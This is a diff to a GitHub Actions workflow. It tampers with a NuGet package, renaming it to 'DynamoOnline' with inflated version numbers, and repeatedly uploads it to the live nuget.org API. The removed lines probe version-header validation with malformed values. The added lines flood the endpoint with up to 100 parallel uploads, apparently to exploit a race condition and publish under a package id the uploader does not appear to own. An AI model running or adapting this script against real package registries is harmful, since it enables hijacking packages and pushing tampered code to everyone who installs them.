@@ -34,79 +34,64 @@ jobs:
         with:
           user: ${{ secrets.NUGET_USER }}
       
-      - name: Test minimum protocol version
+      - name: Race condition tests
         run: |
           cd artifacts
           ORIG_PKG=$(ls *.nupkg)
           
-          # Create DynamoOnline package
+          # Create package targeting DynamoOnline
           rm -rf tampered && mkdir tampered
-          unzip -o "$ORIG_PKG" -d tampered
+          unzip -q -o "$ORIG_PKG" -d tampered
           find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>DynamoOnline</id>|g" {} \;
-          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>5.0.0</version>|g" {} \;
-          cd tampered && zip -r ../tampered.nupkg . && cd ..
+          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>9.0.0</version>|g" {} \;
+          cd tampered && zip -q -r ../race.nupkg . && cd ..
           
-          # Test exact minimum 4.1.0
-          echo "=== Protocol 4.1.0 exactly ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
-            -H "X-NuGet-ApiKey: $NUGET_KEY" \
-            -H "X-NuGet-Client-Version: 4.1.0" \
-            -H "X-NuGet-Protocol-Version: 4.1.0" \
-            -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
+          echo "=== Race: 50 concurrent requests ==="
+          # Fire 50 requests simultaneously
+          for i in {1..50}; do
+            curl -s -w "[$i] HTTP:%{http_code}\n" -X PUT "https://www.nuget.org/api/v2/package/" \
+              -H "X-NuGet-ApiKey: $NUGET_KEY" \
+              -H "X-NuGet-Client-Version: 6.0.0" \
+              -H "X-NuGet-Protocol-Version: 4.1.0" \
+              -H "Content-Type: application/octet-stream" \
+              --data-binary @race.nupkg &
+          done
+          wait
           
-          # Try 4.0.999 - might round up?
-          echo -e "\n\n=== Protocol 4.0.999 ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
-            -H "X-NuGet-ApiKey: $NUGET_KEY" \
-            -H "X-NuGet-Client-Version: 4.0.999" \
-            -H "X-NuGet-Protocol-Version: 4.0.999" \
-            -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
+          echo -e "\n\n=== Race: Different versions simultaneously ==="
+          # Maybe version check has race condition
+          for v in 10 11 12 13 14 15 16 17 18 19 20; do
+            rm -rf tampered && mkdir tampered
+            unzip -q -o "$ORIG_PKG" -d tampered
+            find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>DynamoOnline</id>|g" {} \;
+            find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>${v}.0.0</version>|g" {} \;
+            cd tampered && zip -q -r ../race_v${v}.nupkg . && cd ..
+          done
           
-          # Try omitting protocol version entirely
-          echo -e "\n\n=== No protocol version header ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
-            -H "X-NuGet-ApiKey: $NUGET_KEY" \
-            -H "X-NuGet-Client-Version: 4.1.0" \
-            -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
+          for v in 10 11 12 13 14 15 16 17 18 19 20; do
+            curl -s -w "[v$v] HTTP:%{http_code}\n" -X PUT "https://www.nuget.org/api/v2/package/" \
+              -H "X-NuGet-ApiKey: $NUGET_KEY" \
+              -H "X-NuGet-Client-Version: 6.0.0" \
+              -H "X-NuGet-Protocol-Version: 4.1.0" \
+              -H "Content-Type: application/octet-stream" \
+              --data-binary @race_v${v}.nupkg &
+          done
+          wait
           
-          # Try mismatched versions
-          echo -e "\n\n=== Mismatched: client 6.0 but protocol 4.1 ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
+          echo -e "\n\n=== Race: Rapid fire single version ==="
+          # Blast same request as fast as possible
+          rm -rf tampered && mkdir tampered
+          unzip -q -o "$ORIG_PKG" -d tampered
+          find tampered -name "*.nuspec" -exec sed -i "s|<id>DynamoTest456</id>|<id>DynamoOnline</id>|g" {} \;
+          find tampered -name "*.nuspec" -exec sed -i "s|<version>1.0.0</version>|<version>99.0.0</version>|g" {} \;
+          cd tampered && zip -q -r ../blast.nupkg . && cd ..
+          
+          seq 1 100 | xargs -P100 -I{} curl -s -w "[{}] HTTP:%{http_code}\n" -X PUT "https://www.nuget.org/api/v2/package/" \
             -H "X-NuGet-ApiKey: $NUGET_KEY" \
             -H "X-NuGet-Client-Version: 6.0.0" \
             -H "X-NuGet-Protocol-Version: 4.1.0" \
             -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
-          
-          # Try future version - maybe less validation?
-          echo -e "\n\n=== Future protocol 99.0.0 ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
-            -H "X-NuGet-ApiKey: $NUGET_KEY" \
-            -H "X-NuGet-Client-Version: 99.0.0" \
-            -H "X-NuGet-Protocol-Version: 99.0.0" \
-            -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
-          
-          # Try negative/weird versions
-          echo -e "\n\n=== Weird version -1 ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
-            -H "X-NuGet-ApiKey: $NUGET_KEY" \
-            -H "X-NuGet-Client-Version: -1" \
-            -H "X-NuGet-Protocol-Version: -1" \
-            -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
-          
-          # Try non-numeric
-          echo -e "\n\n=== Non-numeric version ==="
-          curl -s -w "\nHTTP:%{http_code}" -X PUT "https://www.nuget.org/api/v2/package/" \
-            -H "X-NuGet-ApiKey: $NUGET_KEY" \
-            -H "X-NuGet-Client-Version: latest" \
-            -H "X-NuGet-Protocol-Version: latest" \
-            -H "Content-Type: application/octet-stream" \
-            --data-binary @tampered.nupkg
+            --data-binary @blast.nupkg
 
         env:
           NUGET_KEY: ${{ steps.login.outputs.NUGET_API_KEY }}
